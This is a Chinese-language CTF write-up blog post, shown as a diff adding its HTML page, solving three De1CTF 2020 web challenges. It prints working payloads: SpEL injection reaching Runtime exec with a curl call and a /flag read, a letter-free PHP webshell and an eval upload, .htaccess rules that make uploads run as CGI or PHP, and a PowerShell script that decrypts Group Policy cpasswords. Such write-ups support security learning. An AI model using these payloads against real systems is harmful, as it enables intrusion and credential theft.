@@ -1,0 +1,769 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,web,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="又是一年De1CTF,继续被吊锤orz">
+<meta name="keywords" content="ctf,web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="De1CTF2020 web 复现">
+<meta property="og:url" content="http://yoursite.com/2020/05/05/De1CTF2020-web-wp/index.html">
+<meta property="og:site_name" content="k0t0r1の家">
+<meta property="og:description" content="又是一年De1CTF,继续被吊锤orz">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2020_web_wp/31cc8967e3e41438367ece9ca779cba5.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2020_web_wp/2b482233fd72605661c487664422adc4.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2020_web_wp/720a5448c2caa46fa49990c9ebb2135b.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2020_web_wp/9567d93e27148ecd94111b054f4ee456.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2020_web_wp/b75aa6d8fa91c75d07a2a0cd15a8bc4b.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2020_web_wp/8f7916251712bbccf3a8a6bec13d6002.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2020_web_wp/dc939bb2fa89756c9792612577ca0f73.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2020_web_wp/824b4646008f87bc8d4f93fddeae1caf.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2020_web_wp/1b8ff059aaafb3703eddd5ebd1343f3b.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2020_web_wp/259c810f0bcba7bbaf10f82cdd9a0384.png">
+<meta property="og:updated_time" content="2020-05-05T16:44:47.235Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="De1CTF2020 web 复现">
+<meta name="twitter:description" content="又是一年De1CTF,继续被吊锤orz">
+<meta name="twitter:image" content="http://shifeng-kaze.cn/blog/De1CTF2020_web_wp/31cc8967e3e41438367ece9ca779cba5.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/05/05/De1CTF2020-web-wp/">
+
+
+
+
+
+  <title>De1CTF2020 web 复现 | k0t0r1の家</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">k0t0r1の家</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/05/De1CTF2020-web-wp/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="k0t0r1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://shifeng-kaze.cn/blog/head/kotori.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="k0t0r1の家">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">De1CTF2020 web 复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-05T14:05:46+09:00">
+                2020-05-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>又是一年De1CTF,继续被吊锤orz</p>
+<a id="more"></a>
+<h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>这题进去是个计算器，应该不会再是拟态那题了吧233<br>抓个包发现</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2020_web_wp/31cc8967e3e41438367ece9ca779cba5.png" alt=""></p>
+<p>提示了SPEL注入</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2020_web_wp/2b482233fd72605661c487664422adc4.png" alt=""></p>
+<p>测试一下，确实是SPEL</p>
+<p>然后尝试各种姿势，发现<code>java.lang、T()、getClass、toString()</code>这些都被过滤了，java萌新傻了Orz</p>
+<p>于是参照这篇文章<br><a href="https://www.jianshu.com/p/e3c77c053359" target="_blank" rel="noopener">https://www.jianshu.com/p/e3c77c053359</a><br>写了个payload<br><code>&#39;&#39;.class.forName(&#39;java.la&#39;+&#39;ng.Runtime&#39;).getDeclaredMethods()[16].invoke(&#39;&#39;.class.forName(&#39;java.lan&#39;+&#39;g.Runtime&#39;).getDeclaredMethods()[8].invoke(null),&#39;curl ip&#39;)</code><br>然而本地能用，到这题的环境上就用不了了，测了一下发现用<code>[]</code>就会400，但我看大佬的wp可以用数组呀？？？我人傻了</p>
+<p>最后还是大佬们的操作比较强<br><code>&#39;&#39;.class.forName(%27java.la%27%2B%27ng.System%27).getProperties()</code><br>获得所有包<br><code>&#39;&#39;.class.forName(&#39;java.nio.file.Files&#39;).readAllLines(&#39;&#39;.class.forName(&#39;java.nio.file.Paths&#39;).get(&#39;/flag&#39;))</code><br>得flag</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2020_web_wp/720a5448c2caa46fa49990c9ebb2135b.png" alt=""></p>
+<p>Java整得少实在不知道利用哪些类好</p>
+<h2 id="Hard-Pentest-1"><a href="#Hard-Pentest-1" class="headerlink" title="Hard_Pentest_1"></a>Hard_Pentest_1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//Clear the uploads directory every hour</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$sandbox = &quot;uploads/&quot;. md5(&quot;De1CTF2020&quot;.$_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line">if($_POST[&quot;submit&quot;])&#123;</span><br><span class="line">    if (($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 2048) &amp;&amp; Check())&#123;</span><br><span class="line">        if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)&#123;</span><br><span class="line">            die($_FILES[&quot;file&quot;][&quot;error&quot;]);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $filename=md5($_SERVER[&apos;REMOTE_ADDR&apos;]).&quot;_&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">            move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $filename);</span><br><span class="line">            echo &quot;save in:&quot; . $sandbox.&quot;/&quot; . $filename;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;Not Allow!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Check()&#123;</span><br><span class="line">    $BlackExts = array(&quot;php&quot;);</span><br><span class="line">    $ext = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">    $exts = trim(end($ext));</span><br><span class="line">    $file_content = file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);</span><br><span class="line"></span><br><span class="line">    if(!preg_match(&apos;/[a-z0-9;~^`&amp;|]/is&apos;,$file_content)  &amp;&amp; </span><br><span class="line">        !in_array($exts, $BlackExts) &amp;&amp; </span><br><span class="line">        !preg_match(&apos;/\.\./&apos;,$_FILES[&quot;file&quot;][&quot;name&quot;])) &#123;</span><br><span class="line">          return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;upload&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>这题有点想当然了，没仔细审以为后缀php是大小写都过滤了，只要后缀phP就可以直接绕过的</p>
+<p>然后比较麻烦的是这个正则过滤，过滤掉了字母数字，甚至丧心病狂地连<code>;</code>都给过滤了，难顶<br>字符部分可以用phithon大佬的脚本直接绕过<br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a><br>而<code>;</code>的绕过则比较有意思，直接用<code>&lt;?=code?&gt;</code>直接结束这段php，以此来代替<code>;</code>的作用</p>
+<p>于是处理一下脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=$_=[]?&gt;&lt;?=$_=@&quot;$_&quot;?&gt;&lt;?=$_=$_[&apos;!&apos;==&apos;@&apos;]?&gt;&lt;?=$____=&apos;_&apos;?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$_=$$____?&gt;&lt;?=$_[__]($_[_],$_[___])?&gt;</span><br></pre></td></tr></table></figure>
+<p>由于环境是php7.2，因此用<code>assert()</code>无法执行命令（这里整了好久，一直懵逼为啥执行不了），这里修改成了直接传入函数执行<br>然后传一个shell上去<br><code>__=file_put_contents&amp;_=kotori.php&amp;___=&lt;?php eval($_POST[0]);</code></p>
+<p>蚁剑连接上去，可以看到是<code>Windows Server</code>。下面就是windows的渗透了</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2020_web_wp/9567d93e27148ecd94111b054f4ee456.png" alt=""></p>
+<p>使用<code>net use</code>命令列出网络名，能查找到hint</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2020_web_wp/b75aa6d8fa91c75d07a2a0cd15a8bc4b.png" alt=""></p>
+<p>是一个压缩包，解压需要密码</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2020_web_wp/8f7916251712bbccf3a8a6bec13d6002.png" alt=""></p>
+<p>解压密码的获得参照这里<br><a href="https://blog.csdn.net/Fly_hps/article/details/80641585" target="_blank" rel="noopener">域渗透——利用SYSVOL还原组策略中保存的密码</a></p>
+<p>先用<code>ipconfig/all</code>获得主机所在域</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2020_web_wp/dc939bb2fa89756c9792612577ca0f73.png" alt=""></p>
+<p>然后访问路径<code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2020_web_wp/824b4646008f87bc8d4f93fddeae1caf.png" alt=""></p>
+<p>然后找到<code>\\test.local\SYSVOL\test.local\Policies\{ID}\User\Preferences\Groups\Groups.xml</code>这个文件。翻了一下发现只有ID是<code>{B1248E1E-B97D-4C41-8EA4-1F2600F9264B}</code>有这个文件，于是下载下来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;Groups clsid=&quot;&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;&quot;&gt;&lt;User clsid=&quot;&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;&quot; name=&quot;HintZip_Pass&quot; image=&quot;2&quot; changed=&quot;2020-04-15 14:43:23&quot; uid=&quot;&#123;D33537C1-0BDB-44B7-8628-A6030A298430&#125;&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08&quot; changeLogon=&quot;1&quot; noChange=&quot;0&quot; neverExpires=&quot;0&quot; acctDisabled=&quot;0&quot; userName=&quot;HintZip_Pass&quot;/&gt;&lt;/User&gt;</span><br><span class="line">&lt;/Groups&gt;</span><br></pre></td></tr></table></figure>
+<p>密码是加密过的，是使用AES256进行加密。由于微软提供了<a href="https://msdn.microsoft.com/en-us/library/cc422924.aspx" target="_blank" rel="noopener">私钥</a>，因此能够还原出密码</p>
+<p>利用已有powershell脚本还原即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">function Get-DecryptedCpassword &#123;</span><br><span class="line">    [CmdletBinding()]</span><br><span class="line">    Param (</span><br><span class="line">        [string] $Cpassword </span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        #Append appropriate padding based on string length  </span><br><span class="line">        $Mod = ($Cpassword.length % 4)</span><br><span class="line">        </span><br><span class="line">        switch ($Mod) &#123;</span><br><span class="line">        &apos;1&apos; &#123;$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)&#125;</span><br><span class="line">        &apos;2&apos; &#123;$Cpassword += (&apos;=&apos; * (4 - $Mod))&#125;</span><br><span class="line">        &apos;3&apos; &#123;$Cpassword += (&apos;=&apos; * (4 - $Mod))&#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $Base64Decoded = [Convert]::FromBase64String($Cpassword)</span><br><span class="line">        </span><br><span class="line">        #Create a new AES .NET Crypto Object</span><br><span class="line">        $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider</span><br><span class="line">        [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,</span><br><span class="line">                             0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)</span><br><span class="line">        </span><br><span class="line">        #Set IV to all nulls to prevent dynamic generation of IV value</span><br><span class="line">        $AesIV = New-Object Byte[]($AesObject.IV.Length) </span><br><span class="line">        $AesObject.IV = $AesIV</span><br><span class="line">        $AesObject.Key = $AesKey</span><br><span class="line">        $DecryptorObject = $AesObject.CreateDecryptor() </span><br><span class="line">        [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)</span><br><span class="line">        </span><br><span class="line">        return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)</span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    catch &#123;Write-Error $Error[0]&#125;</span><br><span class="line">&#125;  </span><br><span class="line">Get-DecryptedCpassword &quot;uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2020_web_wp/1b8ff059aaafb3703eddd5ebd1343f3b.png" alt=""></p>
+<p>解压得到flag与下一题的提示</p>
+<p>## </p>
+<h2 id="check-in"><a href="#check-in" class="headerlink" title="check in"></a>check in</h2><p>对文件内容有过滤</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2020_web_wp/259c810f0bcba7bbaf10f82cdd9a0384.png" alt=""></p>
+<p>对文件名过滤了<code>ph</code>、<code>ml</code>、<code>cgi</code>，同时进行了MIME头的检测<br>这里利用的是<code>Apache Mod CGI</code>，这个最初是用来绕<code>disabled function</code>的，没去想到在文件上传上的利用</p>
+<p><code>.htaccess</code>设置其它后缀解析为cgi程序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .ant</span><br></pre></td></tr></table></figure>
+<p>然后写个shell脚本即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#! /bin/bash</span><br><span class="line">echo -ne &quot;Content-Type: text/html\n\n&quot;</span><br><span class="line">ls -l</span><br></pre></td></tr></table></figure>
+<p>这里的<code>Content-Type</code>是防止出现500错误</p>
+<p>本来应该挺简单的，不过一直出现问题。放到本地上测试后看apache的错误日志，发现报错<code>not found file or dictionary</code>，查了下才知道又是window和linux之间换行符不同造成的问题，在linux下编辑文件即可</p>
+<p>还有另一种做法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Addtype application/x-httpd-p\</span><br><span class="line">hp .jpg</span><br></pre></td></tr></table></figure>
+<p><code>.htaccess</code>换行拼接即可</p>
+<p>## </p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/05/在IDEA中使用MBean创建Spring项目/" rel="next" title="在IDEA中使用MBean创建Spring项目">
+                <i class="fa fa-chevron-left"></i> 在IDEA中使用MBean创建Spring项目
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/01/31/hgame2021-web-wp/" rel="prev" title="hgame2021 web 复现">
+                hgame2021 web 复现 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="http://shifeng-kaze.cn/blog/head/kotori.jpg" alt="k0t0r1">
+            
+              <p class="site-author-name" itemprop="name">k0t0r1</p>
+              <p class="site-description motion-element" itemprop="description">～いらっしゃいません～</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://shifeng-kaze.cn/" title="shifeng-kaze" target="_blank">shifeng-kaze</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://aluvion.github.io" title="Aluvion" target="_blank">Aluvion</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#calc"><span class="nav-number">1.</span> <span class="nav-text">calc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hard-Pentest-1"><span class="nav-number">2.</span> <span class="nav-text">Hard_Pentest_1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#check-in"><span class="nav-number">3.</span> <span class="nav-text">check in</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">k0t0r1</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
